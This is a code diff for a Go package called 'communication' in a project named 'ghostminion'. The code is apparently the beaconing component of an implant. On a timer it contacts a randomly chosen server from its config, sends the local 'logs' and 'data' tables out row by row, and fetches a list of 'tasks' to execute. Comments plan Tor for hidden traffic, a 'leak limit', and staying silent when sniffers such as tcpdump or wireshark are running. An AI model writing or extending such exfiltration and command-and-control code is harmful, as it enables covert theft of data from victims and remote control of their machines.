@@ -1,67 +1,45 @@
 package communication
 
 import (
-	"bytes"
-	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"ghostminion/config"
 	"ghostminion/db"
-	"io"
 	"math/rand"
-	"net/http"
 	"time"
 )
 
 /*
-for x time send an HTTPS packet to one of the given servers. (this will be in main)
-before connection.
-check if can communicate.
-after connection.
-	- send logs and data (first logs and then data).
-	- get a "todo list".
 
 consider using tor for hidden communication.
 
 don't send too much data (its a little risky) - make leak limit
-don't communicate if there are sniffers (tcpdump, wireshark, etc..)
-don't communicate if there is too much cpu usage
+don't leakDataAndGetTasks if there are sniffers (tcpdump, wireshark, etc..)
+don't leakDataAndGetTasks if there is too much cpu usage
 todo: search for more risky communication times
 
 */
 
-var serverConfig config.ServerConfig
+func CommunicationRoutine(intervalSeconds int) {
+	ticker := time.NewTicker(time.Duration(intervalSeconds) * time.Second)
+	defer ticker.Stop()
 
-func canCommunicate(client http.Client, serverConfig config.ServerConfig) bool {
-	route := fmt.Sprintf("https://%s:%d/reception", serverConfig.Address, serverConfig.Port)
-	values := map[string]string{"challenge": serverConfig.Key}
-	jsonValue, _ := json.Marshal(values)
-	res, _ := client.Post(route, "application/json", bytes.NewBuffer(jsonValue))
-	if res.StatusCode == 200 {
-		return true
+	for {
+		<-ticker.C
+		serverConfig := getRandomServer()
+		if !CanCommunicate(serverConfig) {
+			fmt.Printf("Communicating with server %s failed", serverConfig.Address)
+		} else {
+			sendData("logs")
+			sendData("data")
+			tasks := getTasks(serverConfig) // TODO: handle the tasks
+			HandleTasks(tasks)
+		}
 	}
-	return false
 }
 
-func communicate() []byte {
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: true, // todo remove this. (pass certificate instead).
-			},
-		},
-		Timeout: 60 * time.Second,
-	}
+func sendData(table string) {
 
-	handleTableDataLeak("logs", client)
-	handleTableDataLeak("data", client)
-
-	todos := askForTodos(client)
-	return todos
-}
-
-func handleTableDataLeak(table string, client *http.Client) {
-	receptionRoute := fmt.Sprintf("https://%s:%d/reception", serverConfig.Address, serverConfig.Port)
 	for {
 		result, err := db.ReadOldestDataRow(table)
 		if err != nil {
@@ -72,43 +50,43 @@ func handleTableDataLeak(table string, client *http.Client) {
 		if err != nil {
 			return
 		}
-
-		reader := bytes.NewReader(jsonData)
-		if reader == nil {
-			return
-		}
-		_, _ = client.Post(receptionRoute, "application/json", reader)
+		_, _, _ = SendRequest(
+			POST,
+			CreateRoute(getRandomServer(), "receive"),
+			map[string]string{
+				"Content-Type": "application/json",
+			},
+			jsonData,
+		)
 	}
 }
 
-func askForTodos(client *http.Client) []byte {
-	todosRoute := fmt.Sprintf("https://%s:%d/todos", serverConfig.Address, serverConfig.Port)
-
-	resp, err := client.Get(todosRoute)
+func getTasks(serverConfig config.ServerConfig) []byte {
+	tasks, _, err := SendRequest(
+		GET,
+		CreateRoute(serverConfig, "tasks"),
+		map[string]string{
+			"Accept": "application/json",
+		},
+		nil,
+	)
 	if err != nil {
 		fmt.Println("Error:", err)
 		return nil
 	}
-	defer resp.Body.Close()
-
-	todos, err := io.ReadAll(resp.Body)
-	if err != nil {
-		fmt.Println("Error reading response body:", err)
-		return nil
-	}
-	return todos
+	return tasks
 }
 
-func getRandomServer() *config.ServerConfig {
+func getRandomServer() config.ServerConfig {
 	configInstance, err := config.GetConfig()
 	if err != nil {
-		return nil
+		return config.ServerConfig{}
 	}
 	servers := configInstance.Communication.Servers
 	if len(servers) == 0 {
-		return nil
+		return config.ServerConfig{}
 	}
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	index := rng.Intn(len(servers))
-	return &servers[index]
+	return servers[index]
 }
